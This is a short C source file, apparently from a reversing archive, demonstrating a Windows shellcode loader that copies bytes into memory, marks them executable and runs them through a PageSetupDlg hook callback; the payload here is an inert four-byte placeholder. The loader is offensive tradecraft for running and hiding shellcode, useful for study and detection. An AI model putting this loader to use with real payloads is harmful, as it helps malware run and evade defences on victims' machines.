/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  PageSetupDlg
*/

#include <windows.h>
#include <stdint.h>

#pragma comment(lib,"comdlg32")


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    PAGESETUPDLG    psd;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        ZeroMemory (&psd, sizeof(PAGESETUPDLG));
        psd.lStructSize         = sizeof(PAGESETUPDLG);

        // there are 2 options: Page Setup or Page Paint
        //-- option 1: Page Setup
        psd.Flags               = PSD_ENABLEPAGESETUPHOOK;
        psd.lpfnPageSetupHook   = (LPPAGESETUPHOOK)runtime;

        // //-- option 2: Page paint, will show a dialog!!!
        // psd.Flags               = PSD_ENABLEPAGEPAINTHOOK;
        // psd.lpfnPagePaintHook   = (LPPAGEPAINTHOOK)runtime;

        PageSetupDlg (&psd);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}